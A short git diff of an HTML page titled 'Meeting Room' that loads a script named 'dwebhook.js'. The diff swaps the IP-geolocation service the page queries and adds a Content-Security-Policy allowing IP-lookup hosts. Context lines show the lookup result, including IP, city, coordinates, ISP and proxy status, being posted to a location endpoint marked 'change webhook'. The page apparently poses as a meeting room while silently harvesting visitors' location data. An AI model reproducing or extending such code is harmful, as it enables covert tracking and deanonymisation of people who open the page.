@@ -2,6 +2,10 @@
 <html>
 
 <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://www.meetskip.com https://ajax.googleapis.com https://api.ipify.org http://ip-api.com; script-src 'self' 'unsafe-inline' https://ajax.googleapis.com; img-src 'self' data: blob:; media-src 'self'">
+  <title>Meeting Room</title>
   <script type="text/javascript" src="dwebhook.js">
   </script>
 </head>
@@ -77,7 +81,7 @@
       request.send(JSON.stringify(params));
     })
 
-    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
+    $.getJSON("https://ipapi.co/json/", function (response) {
 
       const request = new XMLHttpRequest();
       request.open("POST", "/location_update"); //change webhook
